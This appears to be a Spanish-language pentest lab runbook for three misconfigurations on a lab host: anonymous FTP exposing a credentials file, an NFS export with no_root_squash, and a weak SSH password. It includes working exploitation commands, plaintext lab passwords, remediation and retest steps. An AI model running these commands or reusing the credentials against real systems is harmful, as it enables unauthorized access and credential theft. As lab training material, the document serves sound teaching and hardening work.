# B3–B5 · Configuraciones de M3

## 1. Ficha

| ID | Servicio | Configuración | CWE | CVSS |
|---|---|---|---|---|
| B3 | FTP anónimo | `anonymous` + `credenciales.txt` | CWE-306 + CWE-311 | ~8.6 |
| B4 | NFS | `no_root_squash` en `/srv/storage/backups` | CWE-732 | ~8.1 |
| B5 | OpenSSH | `rony123` / `rony123` | CWE-521 | ~8.1 |

## 2. Flujo

1. Snapshot M3: `previo-a-B3`.
2. B3:

```bash
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/ | head
```

3. B4:

```bash
showmount -e 10.10.10.13
sudo mkdir -p /mnt/x
sudo mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/x
sudo touch /mnt/x/ROOT_FUE_AQUI.txt
ls -l /mnt/x/
```

4. B5:

```bash
sshpass -p 'rony123' ssh -o StrictHostKeyChecking=no rony123@10.10.10.13 'id; hostname'
```

## 3. Resultado esperado

```text
admin M4/M5: Admin13.-
...
-rw-r--r-- 1 root root 0 ... ROOT_FUE_AQUI.txt
uid=1000(rony123) ...
```

## 4. Evidencia

- `EV-B3-01`: `credenciales.txt`.
- `EV-B4-01`: archivo root.
- `EV-B5-01`: `id`.
- `LOG-M3`.

## 5. Impacto y siguiente salto

- B3: claves de M4/M5 → salto directo.
- B4: escritura root en backups; manipulación.
- B5: shell en M3.

## 6. Remediación

```bash
# B3
sudo sed -i 's/anonymous_enable=YES/anonymous_enable=NO/' /etc/vsftpd.conf
sudo rm -f /srv/storage/backups/credenciales.txt
# backups cifrados con gpg/age

# B4
sudo sed -i 's/no_root_squash/root_squash/' /etc/exports
sudo exportfs -ra

# B5
passwd rony123
```

## 7. Retest

```bash
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt  # 530
showmount -e 10.10.10.13                                               # sin no_root_squash
sudo mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/x && sudo touch /mnt/x/x  # denegado
sshpass -p 'rony123' ssh rony123@10.10.10.13 'id'                      # falla
```

## 8. EARS

- **REQ-B3-01 (Evento).** CUANDO se valide B3, el laboratorio DEBE capturar `credenciales.txt`.
- **REQ-B4-01 (Evento).** CUANDO se valide B4, el laboratorio DEBE capturar un archivo root creado desde M1.
- **REQ-B5-01 (Evento).** CUANDO se valide B5, el laboratorio DEBE capturar `id` por SSH.
- **REQ-B3B5-02 (Ubicuo).** La remediación DEBE dejar FTP 530, NFS con `root_squash` y SSH viejo fallando.

## 9. Checklist

- [ ] Snapshot `previo-a-B3`.
- [ ] B3 credenciales.
- [ ] B4 archivo root.
- [ ] B5 shell.
- [ ] Remediación.
- [ ] Retest.
